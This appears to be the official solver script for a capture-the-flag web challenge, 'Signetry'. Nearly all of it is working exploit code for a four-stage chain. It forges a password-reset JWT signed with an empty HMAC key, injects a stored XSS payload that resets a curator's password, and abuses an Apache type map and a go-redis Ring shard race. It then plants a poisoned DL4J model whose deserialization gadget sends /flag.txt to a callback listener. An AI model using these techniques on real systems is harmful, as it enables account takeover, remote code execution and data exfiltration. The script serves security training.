#!/usr/bin/env python3
"""
Signetry: official solver.

Front service: Crownspire (Go + gin + go-redis Ring), the only public service.
Back service:  Signetry registry (DL4J, internal): the deserialization sink + flag.

The solve() function implements four stages.

Stage 1 takes over the maintainer account. Crownspire stores opaque login sessions on
the server, but POST /auth/password/update validates reset tokens through qor/auth's
default SessionStorer. The application never sets its signing secret, so an HS256 token
signed with an empty HMAC key can reset the published maintainer account.

Stage 2 obtains a curator session. The maintainer submits stored XSS in an appeal and
uses an Apache mod_negotiation type map to reach the loopback-only
/internal/dispatch endpoint. The Warden opens the appeal with a service session.
Because its cookie is HttpOnly, the payload uses a same-origin request to reset the
conservator's password.

Stage 3 bypasses model review. /withdraw sends DEL(unsealed, intake, blob) through a
go-redis Ring. The Ring selects a shard from the first key, so a blob on the other shard
survives after both review markers are removed. This placement occurs in about one
quarter of attempts.

Stage 4 triggers unsafe DL4J deserialization. ModelSerializer restores the poisoned
preprocessor.bin with a raw ObjectInputStream. The gadget reads /flag.txt and sends it
to the callback listener because the registry's /files endpoint is not exposed at the
Apache edge.

The solver uses only the Python standard library and retries the Redis stage until
finalization succeeds.
"""

import argparse
import base64
import hashlib
import hmac
import io
import json
import os
import re
import socket
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile

DEFAULT_MODEL = os.path.join(os.path.dirname(os.path.abspath(__file__)), "poisoned-model.zip")

# Fixed-length (48-byte) callback placeholder baked into the gadget translet. The solver
# overwrites these exact bytes in the model's preprocessor.bin with the real host:port
# (padded back to 48 bytes), so the translet connects to the configured listener. Keep in sync
# with SignetryPayload.EXFIL_PLACEHOLDER.
EXFIL_PLACEHOLDER = b"@@SIGEXFIL@@127.0.0.1:09001@@@@@@@@@@@@@@@@@@@@@"

# The maintainer account appears in GET /api/models. Its generated password is
# unknown, so the reset flaw assigns a known password.
MAINTAINER = "dms@htb.com"
NEW_PASSWORD = "Marr_Reset_2026!"

# /finalize requires the curator role. The Warden's service session resets this
# account through stored XSS, after which the solver logs in with the new password.
CONSERVATOR = "conservator@htb.com"
CURATOR_PW = "Review_Reset_2026!"

# The appeal parser blocks navigation and executable elements but preserves event
# attributes on custom elements. A CSS animation triggers onanimationstart after
# the async render. The handler performs the credential reset in the same origin.
MXSS_PAYLOAD = (
    '<style>@keyframes xp{from{opacity:1}to{opacity:.99}}</style>'
    '<x-review style="animation:xp 1ms" onanimationstart="'
    "fetch('/admin/credential/reset',{method:'POST',credentials:'include',"
    "headers:{'Content-Type':'application/json'},"
    "body:JSON.stringify({uid:'" + CONSERVATOR + "',new_password:'" + CURATOR_PW + "'})})"
    '">z</x-review>'
)


def _b64u(b: bytes) -> bytes:
    return base64.urlsafe_b64encode(b).rstrip(b"=")


def forge_reset_token(uid: str) -> str:
    """Forge a qor/auth password-reset token signed with an empty HMAC key.

    qor/auth's SessionStorer leaves SignedString unset, so ValidateClaims verifies
    HS256 against []byte(""). The reset handler trusts claims.Id (the JWT `jti`) as
    the target account, so the token uses the supplied uid.
    """
    header = _b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = _b64u(json.dumps({"jti": uid}, separators=(",", ":")).encode())
    signing_input = header + b"." + payload
    sig = _b64u(hmac.new(b"", signing_input, hashlib.sha256).digest())  # key = ""
    return (signing_input + b"." + sig).decode()


def http(method, url, data=None, ctype="application/json", extra=None, timeout=15):
    headers = {}
    if data is not None:
        headers["Content-Type"] = ctype
    if extra:
        headers.update(extra)
    req = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def form(fields):
    return urllib.parse.urlencode(fields).encode(), "application/x-www-form-urlencoded"


def takeover(gw):
    """Reset the maintainer password and return an authenticated session header."""
    print(f"[*] forging a qor/auth reset token for {MAINTAINER} (empty signing secret)")
    body, ctype = form({"reset_password_token": forge_reset_token(MAINTAINER), "new_password": NEW_PASSWORD})
    st, _ = http("POST", f"{gw}/auth/password/update", data=body, ctype=ctype)
    if st != 200:
        raise RuntimeError(f"password reset failed (HTTP {st})")

    print("[*] logging in with the new password")
    body, ctype = form({"login": MAINTAINER, "password": NEW_PASSWORD})
    st, resp = http("POST", f"{gw}/api/login", data=body, ctype=ctype)
    if st != 200:
        raise RuntimeError(f"login failed (HTTP {st})")
    sid = json.loads(resp)["session"]
    staff = {"Authorization": sid}

    st, who = http("GET", f"{gw}/api/whoami", extra=staff)
    if st == 200:
        print(f"[+] session established, whoami: {who.decode(errors='replace').strip()}")
    return staff


def client_takeover(gw, staff, wait=10):
    """Obtain a curator session through the Warden appeal review.

    The stored XSS resets the conservator password when the Warden renders the
    appeal. An Apache type map reaches the loopback-only dispatch endpoint.
    """
    print("[*] submitting stored XSS appeal (custom-element onanimationstart)")
    st, _ = http("POST", f"{gw}/api/appeals",
                 data=json.dumps({"body": MXSS_PAYLOAD}).encode(), extra=staff)
    if st != 200:
        raise RuntimeError(f"appeal submission failed (HTTP {st})")
    print("[*] uploading type map and dispatching the Warden through an internal redirect")
    st, _ = http("POST", f"{gw}/api/attachments?name=trigger.var",
                 data=b"URI: ../internal/dispatch\nContent-Type: text/html\n",
                 ctype="text/plain", extra=staff)
    if st != 200:
        raise RuntimeError(f"type-map upload failed (HTTP {st})")
    st, _ = http("GET", f"{gw}/uploads/trigger.var")
    if st != 202:
        raise RuntimeError(f"Warden dispatch failed (HTTP {st})")
    print(f"[*] waiting {wait}s for the Warden to triage the queue")
    time.sleep(wait)

    body, ctype = form({"login": CONSERVATOR, "password": CURATOR_PW})
    st, resp = http("POST", f"{gw}/api/login", data=body, ctype=ctype)
    if st != 200:
        raise RuntimeError("curator takeover failed: the Warden did not reissue the credential")
    cur = {"Authorization": json.loads(resp)["session"]}
    st, who = http("GET", f"{gw}/api/whoami", extra=cur)
    print(f"[+] curator session established, whoami: {who.decode(errors='replace').strip()}")
    return cur


def patch_model(model_bytes, lhost, lport):
    """Overwrite the 48-byte exfil placeholder in the model's preprocessor.bin with the
    callback host and port, padded to the same length.

    The placeholder is inside the compressed preprocessor.bin entry. Rewriting that
    entry through zipfile also updates its CRC."""
    target = f"{lhost}:{lport}".encode()
    field = b"@@SIGEXFIL@@" + target
    if len(field) > len(EXFIL_PLACEHOLDER):
        raise ValueError(f"host:port too long ({len(target)} bytes) for the 48-byte placeholder")
    field = field + b"@" * (len(EXFIL_PLACEHOLDER) - len(field))

    src = zipfile.ZipFile(io.BytesIO(model_bytes), "r")
    out = io.BytesIO()
    patched = False
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zout:
        for item in src.infolist():
            data = src.read(item.filename)
            if EXFIL_PLACEHOLDER in data:
                data = data.replace(EXFIL_PLACEHOLDER, field)
                patched = True
            zout.writestr(item, data)
    if not patched:
        raise RuntimeError("exfil placeholder not found in model; regenerate the gadget (_gen.sh)")
    return out.getvalue()


def _listen(lport, holder):
    """Background TCP listener body; pulls HTB{...} out of whatever the gadget sends."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", lport))
    srv.listen(8)
    srv.settimeout(1.0)
    while not holder.get("stop") and not holder.get("flag"):
        try:
            conn, _ = srv.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        with conn:
            conn.settimeout(4)
            data = b""
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    data += chunk
            except Exception:
                pass
        m = re.search(rb"HTB\{[^}]*\}", data)
        if m:
            holder["flag"] = m.group(0).decode()
    try:
        srv.close()
    except Exception:
        pass


class Listener:
    """Background flag-callback listener. `.get(timeout)` blocks until the gadget
    connects back with the flag, returning the HTB{...} string (or None on timeout)."""

    def __init__(self, lport):
        self._holder = {}
        self._thread = threading.Thread(target=_listen, args=(lport, self._holder), daemon=True)
        self._thread.start()
        time.sleep(0.3)

    def get(self, timeout=45):
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self._holder.get("flag"):
                return self._holder["flag"]
            time.sleep(0.3)
        self._holder["stop"] = True
        return self._holder.get("flag")


def start_listener(lport):
    """Start the background flag-callback listener and return its handle."""
    return Listener(lport)


def attempt(gw, model, staff, curator):
    """Run one stage, withdraw, and finalize attempt."""
    # Register the poisoned model with the maintainer session.
    st, body = http("POST", f"{gw}/stage", data=model, ctype="application/zip", extra=staff)
    if st != 200:
        return None
    token = json.loads(body)["token"]
    # Trigger the cross-shard deletion with the maintainer session.
    http("POST", f"{gw}/withdraw", data=json.dumps({"token": token}).encode(), extra=staff)
    # Finalize with the curator session if the model blob survived.
    st, body = http("POST", f"{gw}/finalize", data=json.dumps({"token": token}).encode(), extra=curator)
    return st, body, token


def solve(gw, model_path, lhost, lport, max_attempts=60):
    """Run the four exploit stages and return the flag."""
    listener = start_listener(lport)
    with open(model_path, "rb") as f:
        model = patch_model(f.read(), lhost, lport)
    print(f"[*] gadget will exfil /flag.txt to {lhost}:{lport}")

    staff = takeover(gw)
    curator = client_takeover(gw, staff)

    print("[*] exploiting go-redis Ring cross-shard DEL (retry until keys shard apart)")
    fired = False
    for i in range(1, max_attempts + 1):
        r = attempt(gw, model, staff, curator)
        if r and r[0] == 202:
            print(f"[+] attempt {i}: shard split hit, model relayed to /certify")
            fired = True
            break
        # 404 = blob shared the first key's shard (deleted); 403 = a marker survived. retry.
    if not fired:
        raise RuntimeError("never hit a favorable shard split; increase --attempts")

    print("[*] waiting for the gadget to call back with the flag...")
    flag = listener.get(timeout=45)
    if not flag:
        raise TimeoutError("no callback received; check --lhost reachability from the target")
    return flag


def autodetect_lhost():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def main():
    parser = argparse.ArgumentParser(description="Signetry four-stage Web challenge solver")
    parser.add_argument("--host", default="localhost", help="Gateway host (default: localhost)")
    parser.add_argument("--port", type=int, default=4000, help="Gateway port (default: 4000)")
    parser.add_argument("--lhost", default=None, help="Callback host the gadget connects back to (default: auto-detect)")
    parser.add_argument("--lport", type=int, default=9001, help="Callback port the solver listens on (default: 9001)")
    parser.add_argument("--model", default=DEFAULT_MODEL, help="Poisoned model zip to stage")
    parser.add_argument("--attempts", type=int, default=60, help="Max stage/withdraw/finalize retries")
    parser.add_argument("--debug", action="store_true", help="Verbose tracebacks")
    args = parser.parse_args()

    if not os.path.isfile(args.model):
        print(f"[!] poisoned model not found: {args.model}", file=sys.stderr)
        sys.exit(2)

    gw = f"http://{args.host}:{args.port}"
    lhost = args.lhost or autodetect_lhost()
    try:
        flag = solve(gw, args.model, lhost, args.lport, args.attempts)
        print(f"\n[+] Flag: {flag}")
        sys.exit(0)
    except Exception as e:
        if args.debug:
            raise
        print(f"\n[!] Failed: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
